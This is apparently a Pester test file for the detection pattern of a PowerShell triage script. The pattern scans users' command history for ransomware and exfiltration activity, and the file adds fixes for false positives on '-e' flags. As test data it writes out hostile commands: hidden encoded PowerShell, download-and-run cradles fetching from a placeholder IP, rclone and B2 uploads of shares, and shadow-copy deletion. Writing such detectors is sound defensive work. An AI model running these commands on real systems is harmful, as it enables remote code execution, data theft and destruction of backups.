# Section 4: ransomware/exfil commands in users' PSReadLine history.
# Issue #2: "-e " matched ordinary commands such as "winget install ... -e",
# which made every admin workstation exit 2 (CRITICAL). These tests use real
# command lines. The match is case-insensitive, as -match is in the script.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    $pattern = Get-PSHistoryExfilPattern
}

Describe 'Get-PSHistoryExfilPattern' {

    Context 'ordinary admin commands do not match (issue #2)' {

        It 'does not match: <Line>' -ForEach @(
            @{ Line = 'winget install --id Git.Git -e --source winget' }
            @{ Line = 'winget install -e --id Microsoft.PowerShell' }
            @{ Line = 'docker run -e TZ=America/New_York -d nginx' }
            @{ Line = 'git grep -e TODO' }
            @{ Line = 'Get-Content .\export.csv -enc UTF8' }
            @{ Line = 'Set-Content .\out.txt -Value $x -enc ascii' }
            @{ Line = 'powershell -ExecutionPolicy Bypass -File .\SecureTriage.ps1' }
            @{ Line = 'Start-Process iexplore.exe' }
            @{ Line = 'Get-Service | Where-Object Status -eq Running' }
        ) {
            $Line | Should -Not -Match $pattern
        }
    }

    Context 'encoded PowerShell commands match' {

        It 'matches: <Line>' -ForEach @(
            @{ Line = 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
            @{ Line = 'powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
            @{ Line = 'powershell -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
            @{ Line = 'pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
            @{ Line = 'Start-Process powershell -ArgumentList "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"' }
            @{ Line = 'POWERSHELL.EXE -E SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
        ) {
            $Line | Should -Match $pattern
        }
    }

    Context 'download-and-run commands match' {

        It 'matches: <Line>' -ForEach @(
            @{ Line = 'Invoke-Expression $payload' }
            @{ Line = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')" }
            @{ Line = 'iex(iwr http://203.0.113.10/a.ps1 -UseBasicParsing)' }
            # "| iex" at the end of a line: the most common cradle. v3.3's
            # IEX[^P] needs a character after IEX, so it never matched this.
            @{ Line = 'irm http://203.0.113.10/a.ps1 | iex' }
        ) {
            $Line | Should -Match $pattern
        }
    }

    Context 'exfil and shadow copy commands still match' {

        It 'matches: <Line>' -ForEach @(
            @{ Line = 'rclone copy C:\Shares remote:bucket --transfers 16' }
            @{ Line = '.\b2.exe upload-file bucket C:\data.zip data.zip' }
            @{ Line = 'Start-Process MEGAsyncSetup64.exe' }
            @{ Line = 'vssadmin delete shadows /all /quiet' }
            @{ Line = 'wmic shadowcopy delete' }
        ) {
            $Line | Should -Match $pattern
        }
    }
}

Describe 'Section 4 history check: wiring' {

    It 'uses Get-PSHistoryExfilPattern for the history search' {
        $scriptText = Get-Content -Path $script:SecureTriagePath -Raw
        $scriptText | Should -Match 'Search-PSHistory\s+-Pattern\s+\(Get-PSHistoryExfilPattern\)'
    }
}
